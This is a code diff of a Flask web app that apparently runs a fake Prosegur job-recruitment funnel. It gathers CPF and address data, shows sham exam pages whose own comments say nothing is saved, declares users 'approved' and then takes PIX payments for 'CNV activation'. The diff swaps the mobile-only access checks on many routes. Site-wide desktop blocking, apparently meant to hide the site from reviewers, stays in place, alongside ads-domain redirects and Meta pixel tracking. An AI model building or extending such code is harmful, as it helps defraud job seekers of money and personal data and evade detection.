@@ -17,7 +17,6 @@ from heroku_optimizer import heroku_optimizer
 from simple_mobile_protection import simple_mobile_only
 from meta_pixels import MetaPixelTracker
 from desktop_blocker import check_and_block_desktop, generate_instant_redirect_response
-from enhanced_mobile_protection import mobile_only_enhanced, check_mobile_access_enhanced, generate_about_blank_response
 
 # Initialize Meta Pixel tracker
 meta_pixel_tracker = MetaPixelTracker()
@@ -73,19 +72,14 @@ from database_service import db_analytics
 @app.before_request
 def block_desktop_access():
     """Block ALL desktop access instantly across entire site"""
-    # Skip static files
-    if request.path.startswith('/static'):
-        return None
-        
     # Skip in Replit development environment completely
     if (os.environ.get('REPL_ID') or 
         os.environ.get('REPLIT_ENVIRONMENT') or 
         'replit' in request.headers.get('Host', '').lower()):
         return None
     
-    # Use enhanced mobile protection
-    if check_mobile_access_enhanced():
-        return generate_about_blank_response()
+    if check_and_block_desktop():
+        return generate_instant_redirect_response()
 
 # Minimum loading time in milliseconds
 MIN_LOADING_TIME = 4000
@@ -95,13 +89,13 @@ def serve_font(filename):
     return send_from_directory('static/fonts', filename)
 
 @app.route("/")
-@mobile_only_enhanced
+@simple_mobile_only
 @performance_monitor
 def index():
     return render_template("index.html")
 
 @app.route("/vagas")
-@mobile_only_enhanced
+@simple_mobile_only
 @performance_monitor
 def vagas():
     """Vagas page with domain redirection from ads domain to main domain"""
@@ -112,19 +106,18 @@ def vagas():
     return render_template("vagas.html")
 
 @app.route("/local")
-@mobile_only_enhanced
+@simple_mobile_only
 @performance_monitor
 def local():
     return render_template("local.html")
 
 @app.route("/veiculo")
-@mobile_only_enhanced
+@simple_mobile_only
 @performance_monitor  
 def veiculo():
     return render_template("veiculo.html")
 
 @app.route("/recebedor")
-@mobile_only_enhanced
 def recebedor():
     try:
         # Skip mobile protection for Heroku to prevent redirect loops
@@ -217,7 +210,7 @@ def cleanup_old_sessions():
         health_monitor.log_error(f"Session cleanup error: {str(e)}", "before_request")
 
 @app.route("/api/consulta-cpf", methods=["POST"])
-@mobile_only_enhanced
+@simple_mobile_only
 def consulta_cpf():
     try:
         data = request.get_json()
@@ -405,7 +398,6 @@ def get_user_data():
     })
 
 @app.route("/address", methods=['GET', 'POST'])
-@mobile_only_enhanced
 def address():
     if request.method == 'POST':
         try:
@@ -533,12 +525,11 @@ def create_shipping_payment():
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route("/info")
-@mobile_only_enhanced
 def info():
     return render_template("info.html")
 
 @app.route("/submit_registration", methods=["POST"])
-@mobile_only_enhanced
+@simple_mobile_only
 def submit_registration():
     try:
         data = request.form
@@ -566,7 +557,6 @@ def submit_registration():
         return jsonify({"success": False, "error": str(e)})
 
 @app.route("/exame")
-@mobile_only_enhanced
 @performance_monitor
 def exame():
     if not session.get('registration_data'):
@@ -578,7 +568,6 @@ def exame():
     return render_template("exame.html")
 
 @app.route("/submit_exam", methods=["POST"])
-@mobile_only_enhanced
 @performance_monitor
 def submit_exam():
     # Exam forms do not save or submit any data - just proceed to next step
@@ -591,7 +580,6 @@ def submit_exam():
     })
 
 @app.route("/psicotecnico")
-@mobile_only_enhanced
 @performance_monitor
 def psicotecnico():
     if not session.get('registration_data'):
@@ -603,7 +591,6 @@ def psicotecnico():
     return render_template("psicotecnico.html")
 
 @app.route("/submit_psicotecnico", methods=["POST"])
-@mobile_only_enhanced
 @performance_monitor
 def submit_psicotecnico():
     # Psychotechnical forms do not save or submit any data - just proceed to approval
@@ -616,7 +603,6 @@ def submit_psicotecnico():
     })
 
 @app.route("/aprovado")
-@mobile_only_enhanced
 def aprovado():
     if not session.get('registration_data'):
         return redirect(url_for('loading', 
@@ -626,7 +612,6 @@ def aprovado():
     return render_template("aprovado.html")
 
 @app.route("/process_payment", methods=["POST"])
-@mobile_only_enhanced
 def process_payment():
     """Display loading page and process PIX payment"""
     # Store form data in session for payment processing
@@ -644,7 +629,6 @@ def process_payment():
         time=3000))
 
 @app.route("/create_pix_payment", methods=["GET", "POST"])
-@mobile_only_enhanced
 def create_pix_payment():
     """Create PIX payment and redirect to payment page"""
     try:
@@ -962,12 +946,12 @@ def resultado(status):
                           now=current_date)
 
 @app.route("/agendamento")
-@mobile_only_enhanced
+@simple_mobile_only
 def agendamento():
     return render_template("agendamento.html")
 
 @app.route("/chat")
-@mobile_only_enhanced
+@simple_mobile_only
 def chat():
     """Chat page for candidate interactions with Prosegur HR"""
     # Get user data from session
@@ -982,7 +966,6 @@ def chat():
                          cpf=user_cpf)
 
 @app.route("/get_training_location")
-@mobile_only_enhanced
 def get_training_location():
     try:
         # Get user's city from session (saved from address form)
@@ -1033,7 +1016,6 @@ def get_training_location():
         app.logger.error(f"Erro na rota get_training_location: {str(e)}")
 
 @app.route('/get_medical_clinic', methods=['POST'])
-@mobile_only_enhanced
 def get_medical_clinic():
     """Get medical clinic location for user using OpenAI"""
     try:
@@ -1091,7 +1073,6 @@ def get_medical_clinic():
         })
 
 @app.route("/api/search-cras-units", methods=["POST"])
-@mobile_only_enhanced
 def search_cras_units():
     """Search the 4 closest CRAS units using OpenAI based on user's CEP and location"""
     try:
@@ -1146,7 +1127,6 @@ def search_cras_units():
         }), 500
 
 @app.route("/admin/load-cras-data")
-@mobile_only_enhanced
 def load_cras_data():
     """Endpoint administrativo para carregar dados CRAS usando OpenAI"""
     try:
@@ -1169,7 +1149,6 @@ def load_cras_data():
         }), 500
 
 @app.route("/agendamento", methods=["POST"])
-@mobile_only_enhanced
 def submit_agendamento():
     try:
         training_date = request.form.get('training_date')
@@ -1205,7 +1184,6 @@ def submit_agendamento():
         }), 500
 
 @app.route("/health")
-@mobile_only_enhanced
 def health_check():
     """Health check endpoint for monitoring"""
     try:
@@ -1244,13 +1222,11 @@ def health_check():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route("/painel")
-@mobile_only_enhanced
 def painel():
     """Analytics dashboard for real-time monitoring"""
     return render_template("painel.html")
 
 @app.route("/api/analytics")
-@mobile_only_enhanced
 def api_analytics():
     """API endpoint for real-time analytics data from database"""
     try:
@@ -1270,19 +1246,18 @@ def api_analytics():
         return jsonify({"error": "Failed to get analytics data"}), 500
 
 @app.route('/login')
-@mobile_only_enhanced
+@simple_mobile_only
 def login():
     """Login page for CNAS activation"""
     return render_template("login.html")
 
 @app.route('/share')
-@mobile_only_enhanced
 def share():
     """Share page for referral program"""
     return render_template("share.html")
 
 @app.route('/aviso')
-@mobile_only_enhanced
+@simple_mobile_only
 def aviso():
     """CNV Digital page"""
     # Get pixel IDs for template
@@ -1296,13 +1271,12 @@ def aviso():
                          pixel_event_data=pixel_event_data)
 
 @app.route('/finalizar')
-@mobile_only_enhanced
+@simple_mobile_only
 def finalizar():
     """CNV Payment page with real PIX transaction"""
     return render_template('finalizar.html')
 
 @app.route('/create_cnv_payment', methods=['POST'])
-@mobile_only_enhanced
 def create_cnv_payment():
     """Create PIX payment for CNV activation"""
     try:
@@ -1368,7 +1342,7 @@ def create_cnv_payment():
         })
 
 @app.route('/check_cnv_payment_status/<payment_id>')
-@mobile_only_enhanced
+@simple_mobile_only
 def check_cnv_payment_status(payment_id):
     """Check CNV PIX payment status"""
     try:
@@ -1394,13 +1368,11 @@ with app.app_context():
     db.create_all()
 
 @app.route("/test_pixel")
-@mobile_only_enhanced
 def test_pixel():
     """Página de teste para Meta Pixel"""
     return render_template("test_pixel.html")
 
 @app.route('/admin/meta-pixels')
-@mobile_only_enhanced
 def admin_meta_pixels():
     """Página administrativa para configuração dos Meta Pixels"""
     return render_template_string('''
@@ -1487,7 +1459,6 @@ def admin_meta_pixels():
     ''')
 
 @app.route('/admin/test-meta-pixels')
-@mobile_only_enhanced
 def test_meta_pixels():
     """Endpoint para testar configuração dos Meta Pixels"""
     try:
